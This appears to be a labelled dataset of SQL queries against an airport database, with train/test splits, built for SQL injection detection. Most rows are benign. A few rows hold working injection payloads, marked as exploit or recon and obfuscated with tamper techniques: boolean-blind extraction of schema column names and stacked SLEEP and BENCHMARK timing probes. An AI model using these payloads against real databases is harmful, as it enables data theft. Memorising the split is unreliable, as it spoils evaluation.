"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""IR"" OR c.name LIKE CONCAT(""%"", ""Poland"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,IR Poland 5,,,,select,airport-S20,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""CCA7"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Miaoli County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Lotniska Polski"", ""%"");",0,CCA7 Airports in Miaoli County Lotniska Polski,,,,select,airport-S18,,,train
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Junín Region"";",0,Junín Region,,,,select,airport-S15,,,test
"UPDATE airport_frequencies SET frequency_mhz = 121.9 WHERE type = ""GND"";",0,121.9 GND,,,,update,airport-U6,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 124.45 AND  118.45  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.7  AND  122.9  ORDER BY frequency;",0,124.45 118.45 122.7 122.9,,,,select,airport-S13,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" WheRE 1800=1800 anD 7477=(SEleCT (CAse wHeN (OrD(MiD((SEleCT iFnuLl(CAsT(Column_nAmE aS Nchar),0x20) FROm INFORMATION_SCHEMA.CoLuMNs WheRE taBlE_nAME=0x616972706f7274 anD table_schema=0x64617461736574 limIT 8,1),2,1))>112) ThEn 7477 ElSe (SEleCT 3822 UNioN SEleCT 1286) enD))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WheRE 1800=1800 anD 7477=(SEleCT (CAse wHeN (OrD(MiD((SEleCT iFnuLl(CAsT(Column_nAmE aS Nchar),0x20) FROm INFORMATION_SCHEMA.CoLuMNs WheRE taBlE_nAME=0x616972706f7274 anD table_schema=0x64617461736574 limIT 8,1),2,1))>112) ThEn 7477 ElSe (SEleCT 3822 UNioN SEleCT 1286) enD))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"SELECT id FROM airports WHERE latitude >= 33.135 AND elevation_feet >= 1467.0 AND longitude BETWEEN -48.383043 AND -81.600684 AND scheduled_service = ""no"" AND continent = ""SA"" AND name LIKE ""%X2BgqrwVr8Lvdi3XJUlI%"" AND type LIKE ""heliport""",0,33.135 1467.0 -48.383043 -81.600684 no SA X2BgqrwVr8Lvdi3XJUlI heliport,,,,select,airport-S23,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,MM 4,,,,select,airport-S19,,,test
"DELETE FROM airport_frequencies WHERE type = ""MISC');SELECT BENCHMARK(5000000,MD5(0x64587a6b))#"";",1," MISC');SELECT BENCHMARK(5000000,MD5(0x64587a6b))# ",recon,sleep2getlock,success,delete,airport-D4,stacked-135,stacked,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Carmanah Point Lighthouse Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Carmanah Point Lighthouse Heliport,,,,select,airport-S14,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CF"" GROUP BY r.name ORDER BY r.name ASC;",0,CF,,,,select,airport-S5,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IQ""",0,IQ,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""PE-ARE""",0,SA PE-ARE,,,,select,airport-S8,,,train
"SELECT id FROM airports WHERE longitude BETWEEN -94.8262469 AND -96.41664 AND type IN (""heliport"",""small_airport"",""heliport"") AND iso_region LIKE ""JP-28""",0,-94.8262469 -96.41664 heliport small_airport heliport JP-28,,,,select,airport-S23,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ET"" OR c.name LIKE CONCAT(""%"", ""North Korea"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,ET North Korea 4,,,,select,airport-S20,,,test
"UPDATE airport_frequencies SET description = ""TRENTO RDO"" WHERE airport_ident = ""YDBR"";",0,TRENTO RDO YDBR,,,,update,airport-U5,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Diedrich Seaplane Base"");",0,Diedrich Seaplane Base,,,,select,airport-S12,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Fisher Airport"") OR name LIKE ""Francisco C. Ada""",0,Fisher Airport Francisco C. Ada,,,,select,airport-S10,,,test
"SELECT id FROM airports WHERE longitude BETWEEN 135.48569 AND 138.187752 AND scheduled_service = ""no""",0,135.48569 138.187752 no,,,,select,airport-S23,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""RW-03"", ""Bujumbura Rural Province"", ""AF"", ""UA"", ""https://en.wikipedia.org/wiki/Donduşeni_District"", ""Airports in Kirikkale Province"")",0,RW-03 Bujumbura Rural Province AF UA https://en.wikipedia.org/wiki/Donduşeni_District Airports in Kirikkale Province,,,,insert,airport-I4,,,test
"SELECT * FROM airport WHERE gps_code = ""EDAW"" OR local_code = ""CDI""",0,EDAW CDI,,,,select,airport-S4,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.1 AND  119.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.9  AND  119.2  ORDER BY frequency;",0,132.1 119.5 122.9 119.2,,,,select,airport-S13,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Webb Footed Kennels"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeroporturi din România"", ""%"");",0,Webb Footed Kennels Airports in (unassigned) Aeroporturi din România,,,,select,airport-S18,,,test
"UPDATE airport_frequencies SET frequency_mhz = 122.95 WHERE type = ""AFIS"";",0,122.95 AFIS,,,,update,airport-U6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""CK"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,CK 4,,,,select,airport-S19,,,test
"UPDATE airport SET municipality = ""Altus"" WHERE iso_country = ""BR""",0,Altus BR,,,,update,airport-U2,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.3 AND  127.0  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  135.725  AND  125.5  ORDER BY frequency;",0,120.3 127.0 135.725 125.5,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AU"") OR a.elevation_ft > 236.0",0,AU 236.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Dawn Ridge Airport"");",0,Dawn Ridge Airport,,,,select,airport-S12,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2586"" AS SIGNED) AND a.iso_country = ""MZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2586 MZ,,,,select,airport-S22,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.95 AND  127.9  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  123.75  AND  118.9  ORDER BY frequency;",0,122.95 127.9 123.75 118.9,,,,select,airport-S13,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (67954, 24999, ""SCIP"", ""MISC"", ""ATIS"", 122.9)",0,67954 24999 SCIP MISC ATIS 122.9,,,,insert,airport-I8,,,test
"DELETE FROM countries WHERE code = ""GF"";",0,GF,,,,delete,airport-D7,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""BIAE"";",0,BIAE,,,,select,airport-S7,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1968.0 AND 101.0",0,1968.0 101.0,,,,select,airport-S2,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91229, ""PTS"", ""Hulutaotun"", ""NDB"", 116900, ""US"")",0,91229 PTS Hulutaotun NDB 116900 US,,,,insert,airport-I10,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Torreón Regional Specialty Hospital Heliport""",0,Torreón Regional Specialty Hospital Heliport,,,,select,airport-S3,,,test
SELECT * FROM airport WHERE icao_code = 'KLGC';,0,KLGC,,,,select,airport-S1,,,test
SELECT * FROM airport WHERE icao_code = 'AYKW';,0,AYKW,,,,select,airport-S1,,,test
"UPDATE navaids SET name = ""Halim Perdanakusuma"" WHERE ident = ""ORI"";",0,Halim Perdanakusuma ORI,,,,update,airport-U7,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S5,,,test
"DELETE FROM airport_frequencies WHERE type = ""CTAF"";",0,CTAF,,,,delete,airport-D4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Davenport Municipal Airport"");",0,Davenport Municipal Airport,,,,select,airport-S12,,,test
"SELECT id FROM airports WHERE latitude <= 8.624139 AND continent LIKE ""AF"" AND name LIKE ""%VNTrvwoluDdGOQZT2roS%""",0,8.624139 AF VNTrvwoluDdGOQZT2roS,,,,select,airport-S23,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BW"";(SELECT * FROM (SELECT/**/(SLEEP/**/(5)))qTGL) AND ""cyCm"" LIKE ""cyCm"" GROUP BY r.name ORDER BY r.name ASC;",1," BW"";(SELECT * FROM (SELECT/**/(SLEEP/**/(5)))qTGL) AND ""cyCm"" LIKE ""cyCm ",recon,commentbeforeparentheses,failure,select,airport-S5,stacked-183,stacked,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-IL""",0,EU US-IL,,,,select,airport-S8,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-0958"";",0,US-0958,,,,select,airport-S7,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CO""",0,CO,,,,select,airport-S6,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Murray-Air Kapolei Airport""",0,Murray-Air Kapolei Airport,,,,select,airport-S3,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AU"") OR a.elevation_ft > 322.0",0,AU 322.0,,,,select,airport-S11,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 830.0 AND 586.0",0,830.0 586.0,,,,select,airport-S2,,,train
"DELETE FROM airport WHERE name LIKE ""Fazenda Serra do Ovo Airport"" OR keywords LIKE ""Dois de Julho"";  ",0,Fazenda Serra do Ovo Airport Dois de Julho,,,,delete,airport-D3,,,test
SELECT * FROM airport WHERE icao_code = 'FTTS';,0,FTTS,,,,select,airport-S1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Femsa Helipad"");",0,Femsa Helipad,,,,select,airport-S12,,,test
"DELETE FROM navaids WHERE ident = ""AA"";",0,AA,,,,delete,airport-D6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ET"" GROUP BY r.name ORDER BY r.name ASC;",0,ET,,,,select,airport-S5,,,test
"UPDATE countries SET keywords = ""Burundian airports"" WHERE code = ""WS"";",0,Burundian airports WS,,,,update,airport-U8,,,test
"DELETE FROM countries WHERE code = ""IO"";",0,IO,,,,delete,airport-D7,,,test
"DELETE FROM airport WHERE name LIKE ""Gerdau Miguel Burnier Heliport"" OR keywords LIKE ""Hard Bargain"";  ",0,Gerdau Miguel Burnier Heliport Hard Bargain,,,,delete,airport-D3,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (92236, ""CAR"", ""Moonlake"", ""NDB"", 110450, ""AR"")",0,92236 CAR Moonlake NDB 110450 AR,,,,insert,airport-I10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""RU"") OR a.elevation_ft > 2526.0",0,RU 2526.0,,,,select,airport-S11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LV"" GROUP BY r.name ORDER BY r.name ASC;",0,LV,,,,select,airport-S16,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""St Mary's Hospital - Streator"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Kepulauan Riau"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""مطارات عمان"", ""%"");",0,St Mary's Hospital - Streator Airports in Kepulauan Riau مطارات عمان,,,,select,airport-S18,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GW"" GROUP BY r.name ORDER BY r.name ASC;",0,GW,,,,select,airport-S5,,,train
"DELETE FROM airport WHERE name LIKE ""Cloncurry Airport"" OR keywords LIKE ""F4 Frösön Air Base, ESPC"";  ",0,"Cloncurry Airport F4 Frösön Air Base, ESPC",,,,delete,airport-D3,,,test
"DELETE FROM airport WHERE name LIKE ""Kogon South Airport"" OR keywords LIKE ""Valley View Hospital"";  ",0,Kogon South Airport Valley View Hospital,,,,delete,airport-D3,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""38TA"") OR name LIKE ""LB19""",0,38TA LB19,,,,select,airport-S10,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4273"" AS SIGNED) AND a.iso_country = ""MW"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4273 MW,,,,select,airport-S22,,,test
"DELETE FROM countries WHERE code = ""LY"";",0,LY,,,,delete,airport-D7,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Cop%C3%A1n_Ruinas_Airport"" WHERE ident = ""ML-0009""",0,https://en.wikipedia.org/wiki/Cop%C3%A1n_Ruinas_Airport ML-0009,,,,update,airport-U3,,,test
"DELETE FROM airport_frequencies WHERE type = ""ASOS"";",0,ASOS,,,,delete,airport-D4,,,test
"INSERT INTO countries (code, name, continent) VALUES (""WS"", ""Saudi Arabia"", ""SA"")",0,WS Saudi Arabia SA,,,,insert,airport-I7,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Cortina_Airport"" WHERE ident = ""DE-0127""",0,https://en.wikipedia.org/wiki/Cortina_Airport DE-0127,,,,update,airport-U3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GU"" GROUP BY r.name ORDER BY r.name ASC;",0,GU,,,,select,airport-S16,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (11893, ""KGNF"", 2600.0, ""CON"", 0, 0)",0,11893 KGNF 2600.0 CON 0 0,,,,insert,airport-I9,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""PA92"",""small_airport"", ""Kwerba Airstrip"",""https://pms.wikipedia.org/wiki/Cardston_Airport"",""EU"")",0,PA92 small_airport Kwerba Airstrip https://pms.wikipedia.org/wiki/Cardston_Airport EU,,,,insert,airport-I3,,,test
"UPDATE airport SET municipality = ""Landsberg"" WHERE iso_country = ""US""",0,Landsberg US,,,,update,airport-U2,,,test
SELECT * FROM airport WHERE icao_code = 'KONL';,0,KONL,,,,select,airport-S1,,,test
"INSERT INTO countries (code, name, continent) VALUES (""NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 15,1),8,1))>114,9021) AND ""NI""=""NI"", ""Niue"", ""AF"")",1," NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 15,1),8,1))>114,9021) AND ""NI""=""NI Niue AF ",exploit,sleep2getlock,success,insert,airport-I7,boolean-36,boolean,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""VVPB"";",0,VVPB,,,,select,airport-S7,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Destin;""",0,Destin,,,,select,airport-S21,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Aeropuerto Nacional Militar de Ciudad de México, Estación Aeronaval Ciudad de México"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Vaduz"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Beninese airports"", ""%"");",0,"Aeropuerto Nacional Militar de Ciudad de México, Estación Aeronaval Ciudad de México Airports in Vaduz Beninese airports",,,,select,airport-S18,,,test
"UPDATE airport_frequencies SET frequency_mhz = 126.1 WHERE type = ""Special rules ap"";SELECT IF/**/((23=39),SLEEP/**/(5),2032)#"";",1," 126.1 Special rules ap SELECT IF/**/((23=39),SLEEP/**/(5),2032)# ",recon,commentbeforeparentheses,success,update,airport-U6,stacked-87,stacked,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Aurora St Luke's Medical Center Heliport""",0,Aurora St Luke's Medical Center Heliport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""FR""",0,FR,,,,select,airport-S9,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""JM""",0,JM,,,,select,airport-S6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Comanche Livestock Airport"");",0,Comanche Livestock Airport,,,,select,airport-S12,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""GB"") OR a.elevation_ft > 19.0",0,GB 19.0,,,,select,airport-S11,,,test
"DELETE FROM runways WHERE airport_ident = ""US-8436"";",0,US-8436,,,,delete,airport-D5,,,test
"UPDATE navaids SET name = ""Roi Namur"" WHERE ident = ""LCG"";",0,Roi Namur LCG,,,,update,airport-U7,,,test
SELECT * FROM airport WHERE icao_code = 'OPKT';,0,OPKT,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 2372.0 AND 4101.0",0,2372.0 4101.0,,,,select,airport-S2,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""NG-IM"", ""Kangwon Province"", ""EU"", ""SA"", ""https://en.wikipedia.org/wiki/Ghazni_Province"", ""Lisboa"")",0,NG-IM Kangwon Province EU SA https://en.wikipedia.org/wiki/Ghazni_Province Lisboa,,,,insert,airport-I4,,,test
"UPDATE airport_frequencies SET description = ""LANSING RDO"" WHERE airport_ident = ""YCOO"";",0,LANSING RDO YCOO,,,,update,airport-U5,,,test
SELECT * FROM airport WHERE icao_code = 'SURV';,0,SURV,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1555.0 AND 4505.0",0,1555.0 4505.0,,,,select,airport-S2,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ZA"" GROUP BY r.name ORDER BY r.name ASC;",0,ZA,,,,select,airport-S5,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (70106, 298348, ""LGTS"", ""TWR"", ""CORPUS APP/DEP"", 122.8)",0,70106 298348 LGTS TWR CORPUS APP/DEP 122.8,,,,insert,airport-I8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PR"" GROUP BY r.name ORDER BY r.name ASC;",0,PR,,,,select,airport-S5,,,test
"SELECT * FROM airport WHERE gps_code = ""SSOP"" OR local_code = ""F15""",0,SSOP F15,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Lazzi Hotel"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Jefferson County Airport, Jeffco Airport"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""SIFE"", ""%"");",0,"Lazzi Hotel Jefferson County Airport, Jeffco Airport SIFE",,,,select,airport-S17,,,test
"SELECT * FROM airport WHERE gps_code = ""33MT"" OR local_code = ""5XS8""",0,33MT 5XS8,,,,select,airport-S4,,,test
"DELETE FROM airport_frequencies WHERE type = ""CTR"";",0,CTR,,,,delete,airport-D4,,,test
"DELETE FROM airport_frequencies WHERE type = ""CLD"";",0,CLD,,,,delete,airport-D4,,,test
"UPDATE airport_frequencies SET frequency_mhz = 122.2 WHERE type = ""CTAF"";",0,122.2 CTAF,,,,update,airport-U6,,,test
"DELETE FROM airport_frequencies WHERE type = ""A/D"")))/**/HAVING/**/7932=1023/**/AND/**/(((""DfYr""/**/LIKE/**/""DfYr"";",1," A/D"")))/**/HAVING/**/7932=1023/**/AND/**/(((""DfYr""/**/LIKE/**/""DfYr ",recon,space2comment,success,delete,airport-D4,boolean-132,boolean,test
"SELECT id FROM airports WHERE latitude >= 36.70047 AND scheduled_service LIKE ""no"" AND longitude <= -120.51997 AND elevation_feet >= 950.0 AND name LIKE ""%OzSMaglcwezrBDcV5kZ1%"" AND type LIKE ""small_airport""",0,36.70047 no -120.51997 950.0 OzSMaglcwezrBDcV5kZ1 small_airport,,,,select,airport-S23,,,test
"SELECT id FROM airports WHERE longitude BETWEEN 6.073474 AND 141.67 AND iso_region LIKE ""IT-23"" AND type = ""small_airport"" AND scheduled_service = ""no"" AND elevation_feet <= 426.0 AND latitude <= 68.8067",0,6.073474 141.67 IT-23 small_airport no 426.0 68.8067,,,,select,airport-S23,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Great Falls;""",0,Great Falls,,,,select,airport-S21,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Għasri"";",0,Għasri,,,,select,airport-S15,,,test
"UPDATE airport SET home_link = ""http://www.siauliuaeroklubas.lt/"" WHERE name = ""Penske Heliport""",0,http://www.siauliuaeroklubas.lt/ Penske Heliport,,,,update,airport-U4,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 124.1 AND  119.48  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.475  AND  120.7  ORDER BY frequency;",0,124.1 119.48 126.475 120.7,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SWYQ"") OR name LIKE ""75S""",0,SWYQ 75S,,,,select,airport-S10,,,test
"INSERT INTO countries (code, name, continent) VALUES (""CM"", ""Suriname"", ""AS"")",0,CM Suriname AS,,,,insert,airport-I7,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2696"" AS SIGNED) AND a.iso_country = ""JE"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2696 JE,,,,select,airport-S22,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('JP-2339','FR-0780','76AR','TS44');",0,JP-2339 FR-0780 76AR TS44,,,,update,airport-U10,,,train
